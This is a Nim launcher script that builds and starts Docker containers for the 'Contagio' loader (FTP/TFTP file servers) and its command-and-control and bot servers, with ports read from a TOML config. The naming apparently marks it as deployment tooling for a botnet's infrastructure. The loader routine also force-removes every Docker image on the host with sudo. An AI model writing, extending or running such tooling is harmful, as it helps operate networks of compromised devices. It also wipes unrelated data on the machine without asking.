import os
import parsetoml
import strutils


var ftpport, tftpport, loaderport, cncport, botport: string


var loaderScreenName = "loader"
var cncScreenName = "cnc"



proc loader() =
    var _ = execShellCmd("sudo docker rmi -f $(docker images -aq)")
    var code = execShellCmd("sudo docker build -f ./docker/dockerfile -t contagio_loader .")

    if code != 0:
        sleep(3000)
        return

    code = execShellCmd("screen -dmS " & loaderScreenName &
            " sudo docker run -p " & ftpport & ":" & ftpport & " -p " &
            tftpport &
            ":" & tftpport &
            " -p " & loaderport &
            ":" &
            loaderport & " -t contagio_loader")

    if code != 0:
        sleep(3000)
        return

    let _ = execShellCmd("clear")
    echo "===================================="
    echo "    Contagio loader is running "
    echo "    With screen name: " & loaderScreenName
    echo "===================================="
    sleep(5000)



proc cncbot() =
    var code = execShellCmd("sudo docker build -f ./docker/Dockerfile -t contagio_cnc .")

    if code != 0:
        sleep(3000)
        return

    code = execShellCmd("screen -dmS " & cncScreenName &
            " sudo docker run -p " & cncport & ":" & cncport & " -p " &
            botport & ":" & botport & " -t contagio_cnc")

    if code != 0:
        sleep(3000)
        return

    let _ = execShellCmd("clear")

    echo "===================================="
    echo "  Contagio cnc and bot is running "
    echo "  With screen name: " & cncScreenName
    echo "===================================="
    sleep(5000)


proc launchDocker(args: string) =
    if "l" in args:
        loader()
    if "cb" in args:
        cncbot()

proc config() =
    let config = parsetoml.parseFile("./config.toml")

    let loader = config["LoaderServer"].getStr()
    let ftp = config["FtpServer"].getStr()
    let tftp = config["TftpServer"].getStr()
    let cnc = config["CncServer"].getStr()
    let bot = config["BotServer"].getStr()

    ftpport = split(ftp, ":")[1]
    tftpport = split(tftp, ":")[1]
    loaderport = split(loader, ":")[1]
    cncport = split(cnc, ":")[1]
    botport = split(bot, ":")[1]




let _ = os.execShellCmd("sudo -v")
config()

try:
    let a1 = commandLineParams()[0]
    launchDocker(a1)
except CatchableError:
    echo "Invalid args!"
